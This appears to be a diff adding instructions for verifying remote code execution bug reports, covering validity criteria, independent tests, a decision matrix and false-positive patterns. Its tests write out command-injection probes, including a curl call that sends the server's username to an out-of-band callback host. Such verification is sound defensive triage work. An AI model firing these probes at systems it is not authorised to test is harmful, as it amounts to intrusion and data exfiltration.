@@ -1,0 +1,69 @@
+<rce_verification>
+<validity_requirements>
+For an RCE claim to be VALID, you must independently verify:
+
+1. COMMAND EXECUTION ON SERVER
+   - Commands execute on the TARGET SERVER, not locally
+   - NOT: Client-side eval or local command execution
+   - Check: Output contains server-specific identifiers
+
+2. OUTPUT VERIFICATION
+   - Command output proves server-side execution
+   - NOT: Error messages or reflected input
+   - Check: whoami, hostname, id show server values
+
+3. ATTACKER CONTROL
+   - You control the command content
+   - NOT: Fixed commands with no injection point
+   - Check: Can you specify arbitrary commands?
+</validity_requirements>
+
+<independent_control_tests>
+YOU MUST DESIGN YOUR OWN TESTS. Do not reproduce the reporter's tests.
+
+TEST 1: COMMAND EXECUTION PROOF
+Purpose: Verify command executes on server
+Steps:
+1. Use benign verification commands: whoami, hostname, id
+2. Capture output (in-band or via OAST)
+3. Verify output matches SERVER context:
+   - Server hostname (not your local machine)
+   - Server user (www-data, apache, not your username)
+   - Server paths (/var/www, not /Users/you)
+
+TEST 2: OUTPUT SOURCE VERIFICATION
+Purpose: Confirm output is from server
+Steps:
+1. Execute: echo UNIQUE_STRING_$(hostname)
+2. Check response for your unique string + server hostname
+3. Verify hostname is NOT your local machine
+4. Use OAST if in-band output unreliable: curl https://OAST/$(whoami)
+
+TEST 3: COMMAND CONTROL TEST
+Purpose: Verify you control command content
+Steps:
+1. Execute: echo TEST1
+2. Execute: echo TEST2
+3. Verify outputs differ as expected
+4. Try: sleep 5 and verify 5s delay
+</independent_control_tests>
+
+<validity_decision_matrix>
+| Command Output | Output Source | Command Control | Decision |
+|---------------|---------------|-----------------|----------|
+| Server hostname | Server IP (OAST) | Arbitrary commands | VULNERABLE |
+| Local hostname | N/A | Any | NOT RCE (client-side) |
+| Error messages | N/A | N/A | NOT RCE (no execution) |
+| No output | OAST callback | Limited | BLIND RCE - valid |
+| Sandboxed output | Server | Limited | SANDBOXED - verify escape |
+</validity_decision_matrix>
+
+<common_false_positive_patterns>
+REJECT if you observe:
+- Output matches local machine identifiers
+- Client-side JavaScript eval (not server RCE)
+- Template injection without server command access
+- Command strings reflected but not executed
+- Sandboxed execution with no escape path
+</common_false_positive_patterns>
+</rce_verification>
